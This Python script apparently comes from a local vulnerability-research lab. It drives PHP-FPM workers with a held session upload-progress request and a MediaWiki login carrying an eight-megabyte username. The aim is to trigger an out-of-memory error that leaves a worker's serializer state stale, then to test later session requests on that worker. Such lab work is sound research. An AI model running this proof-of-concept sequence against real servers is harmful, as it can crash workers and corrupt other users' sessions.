#!/usr/bin/env python3
"""Consumer vs poisoned 8.3.35 worker.

18852 (8.5.11, 2 workers): held 6 MB upload-progress request with PHPSESSID=SID
                            -> non-empty /sessions/sess_SID stays alive.
18853 (8.3.35, 1 worker):  C0 consumer (326 B) on a clean worker,
                            P  = login with 8,168,673-byte username (OOM at
                                 Session.php:545 then SqlBagOStuff.php:1486,
                                 worker survives, BG(serialize) left stale),
                            C1 consumer on the same worker.

C1 is the decode/encode test: its pre-RINIT session read uses BG(unserialize),
its progress flush uses BG(serialize).
"""
import json, os, subprocess, sys, time

LAB = os.path.dirname(os.path.abspath(__file__))
os.chdir(LAB)
os.environ["FPM_PORT"] = "18853"
SID = "zzz2222222222222222222222222222222"
SESS = os.path.join(LAB, "sessions", "sess_" + SID)
BOUND = "----mw109619boundary"
PRODUCER = 8168673

import fpmstat
import sweep8335b as S


def fcgi(args, port, timeout=400):
    env = dict(os.environ)
    env["FPM_PORT"] = str(port)
    return subprocess.run([sys.executable, "fcgi.py"] + args,
                          capture_output=True, text=True, timeout=timeout, env=env)


def consumer(tag):
    out = "poison_%s.raw" % tag
    p = fcgi(["--method", "POST", "--uri", "/index.php",
              "--content-type", "multipart/form-data; boundary=" + BOUND,
              "--body", "b_cons1w.bin", "--cookie", "PHPSESSID=" + SID,
              "--chunk-size", "65535", "--out", out], 18853)
    raw = b""
    path = os.path.join(LAB, out)
    if os.path.exists(path):
        raw = open(path, "rb").read()
    status = "200"
    for line in raw.split(b"\r\n"):
        if line.startswith(b"Status:"):
            status = line.split(b":", 1)[1].strip().decode()
            break
    body = b""
    if b"\r\n\r\n" in raw:
        body = raw.split(b"\r\n\r\n", 1)[1]
    err = [l for l in p.stderr.splitlines() if "app_status" in l or "reset" in l or "error" in l]
    return {"tag": tag, "status": status, "raw": len(raw), "body": len(body),
            "stderr": err[:2],
            "first": raw.split(b"\r\n", 1)[0].decode("latin1", "replace") if raw else ""}


def sess_size():
    try:
        return os.path.getsize(SESS)
    except OSError:
        return None


def hwm(pid):
    try:
        for line in open("/proc/%s/status" % pid):
            if line.startswith("VmHWM:"):
                return line.split(":", 1)[1].strip()
    except OSError:
        return "gone"


def main():
    hold = None
    rec = {}
    try:
        try:
            os.unlink(SESS)
        except OSError:
            pass
        # held writer on the 8.5.11 two-worker instance
        hold = subprocess.Popen(
            [sys.executable, "fcgi.py", "--method", "POST", "--uri", "/index.php",
             "--content-type", "multipart/form-data; boundary=" + BOUND,
             "--body", "b_bigA.bin", "--cookie", "PHPSESSID=" + SID,
             "--truncate-after", "6001200", "--hold-seconds", "120",
             "--chunk-size", "65535", "--out", "poison_hold.raw"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env={**os.environ, "FPM_PORT": "18852"})
        for i in range(30):
            time.sleep(1)
            if sess_size():
                break
        rec["held_size"] = sess_size()
        print("held file size:", rec["held_size"], "after", i + 1, "s")

        p = S.start_master()
        try:
            procs = fpmstat.status()
            worker = procs[0].get("pid") if procs else None
            rec["worker"] = worker
            rec["hwm_before"] = hwm(worker)
            print("worker", worker, "VmHWM", rec["hwm_before"])

            rec["C0"] = consumer("C0")
            print("C0:", rec["C0"], "file", sess_size())

            res = sweep_login_producer()
            rec["P"] = res
            print("P:", {k: res.get(k) for k in ("http", "peak", "oom", "alive", "worker")})
            rec["hwm_after_P"] = hwm(worker)
            print("VmHWM after P:", rec["hwm_after_P"])

            rec["C1"] = consumer("C1")
            print("C1:", rec["C1"], "file", sess_size())
            rec["worker_alive_after"] = os.path.exists("/proc/%s" % worker)
        finally:
            S.stop_master(p)
    finally:
        if hold is not None:
            hold.terminate()
            try:
                hold.wait(timeout=10)
            except subprocess.TimeoutExpired:
                hold.kill()
        time.sleep(1.0)
        rec["final_size"] = sess_size()
        with open(os.path.join(LAB, "consumer_poison_results.json"), "w") as f:
            json.dump(rec, f, indent=1)
        print(json.dumps(rec, indent=1))


def sweep_login_producer():
    import sweep_login
    open(S.ERR, "w").close()
    mark = S.acc_mark()
    res = sweep_login.attempt(PRODUCER, 1, "poisonP")
    time.sleep(0.3)
    sites = S.oom_sites()
    lines = S.acc_new(mark)
    post = [l for l in lines if 'POST /index.php?title=Special:UserLogin' in l]
    http = peak = None
    if post:
        f = post[-1].split()
        try:
            http = post[-1].split('"')[2].split()[0]
            peak = f[-2]
        except IndexError:
            pass
    worker = (res.get("after") or [None])[0]
    return {"http": http, "len": res.get("len"), "peak": peak,
            "oom": [s.split(" in ")[-1] for s in sites],
            "alive": bool(worker) and os.path.exists("/proc/%s" % worker),
            "worker": worker, "secs": res.get("secs")}


if __name__ == "__main__":
    main()
